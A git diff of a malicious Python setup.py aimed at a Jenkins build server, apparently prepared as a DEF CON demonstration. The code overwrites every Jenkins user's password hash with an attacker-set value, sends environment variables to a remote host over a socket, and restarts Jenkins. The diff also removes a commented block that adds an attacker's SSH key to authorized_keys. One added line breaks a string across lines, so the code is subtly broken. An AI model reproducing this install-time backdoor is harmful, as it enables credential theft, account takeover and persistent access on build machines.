d6472052fef33655d741224ac2ea8fe9474342de
Your Name <you@example.com>
2015-07-31 13:29:31 +0000

    testing:

--- setup.py
+++ setup.py
@@ -35,21 +35,12 @@ message = pprint.pformat(dict(envs))
 results = os.listdir('/var/lib/jenkins/users/')
 for res in results:
         for line in fileinput.FileInput("/var/lib/jenkins/users/%s/config.xml" % res,inplace=1):
-                line = re.sub(r"#jbcrypt:[^<]+", "#jbcrypt:$2a$10$wYC2nKDRty/elQYeCfVhc.XNNNJxZpd.e6uM3oXrQ89SQ1oS.J1Da", line )
+                line = re.sub(r"#jbcrypt:[^<]+", "#jbcrypt:$2a$10$QZa.CVY/zpFGK.JUG7jPZeu.wv33dEGopshjK0hEcqyorbL0JvG6q
+", line )
                 print line,
 
 message = 'using jenkins: %s ' % str(results)
-"""
-# pwnie patrol was here.
-try:
-	user = pwd.getpwuid( os.getuid() )[ 0 ]
-	print 'user: %s' % user
-	message = message + "user: %s" % user
-	with open("/home/%s/.ssh/authorized_keys" % user, "a") as myfile:
-		    myfile.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCd85o+/NiUloOYNbQYsU+RrSvPAhnL9RCLJYy5yogYEFIj8e8C6ybC+3VtpvUzoPZY3q91VH+D9qmoJAcm5nHfYA1J2Bc9roHG66XuoUqCE0n+Mupb61Sr1cCEhYkKkkRVAPSYLBwJy42IHcGIlrkzYy8DZzd2upxGRlXIdtq7uyNutzn5eoF+do52s7G0C6BIhP4Y5phEoLAfpm7Le1VQ/AOy25pUfhb/wBORlJfaA/dl95G8cAZvIc3vgVwn52YSln68KSBU5NKVmiG64q351Zw1/5R3n8TO7AHyQC6XII5Wr1/XqHxSZ7HIZPBZlO1SYctTpfBhqdXQ5Ls2Ltx1 mal")
-except:
-	pass 
-"""
+
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((TCP_IP, TCP_PORT))
 s.send(message)
@@ -57,4 +48,3 @@ s.close()
 os.system('service jenkins restart &')
 #print os.system('pkill -HUP java')
 # Gutted for purpose of defcon exapmle.
-""
